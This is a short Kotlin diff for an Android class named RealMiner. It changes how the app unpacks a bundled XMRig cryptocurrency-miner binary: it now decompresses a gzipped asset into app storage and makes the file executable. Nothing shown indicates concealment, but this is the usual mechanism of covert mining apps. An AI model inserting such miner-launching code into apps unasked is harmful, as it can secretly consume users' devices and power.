@@ -94,16 +94,20 @@ class RealMiner(
 
     private fun extractBinary(): String? {
         val binaryName = "libxmrig.so"
+        val gzName = "libxmrig.so.gz"
         val destFile = File(context.filesDir, binaryName)
+        val gzFile = File(context.filesDir, gzName)
 
         if (destFile.exists() && destFile.length() > 1000000) {
             return destFile.absolutePath
         }
 
         try {
-            context.assets.open(binaryName).use { input ->
-                FileOutputStream(destFile).use { output ->
-                    input.copyTo(output)
+            context.assets.open(gzName).use { input ->
+                java.util.zip.GZIPInputStream(input).use { gz ->
+                    FileOutputStream(destFile).use { output ->
+                        gz.copyTo(output)
+                    }
                 }
             }
             destFile.setExecutable(true)
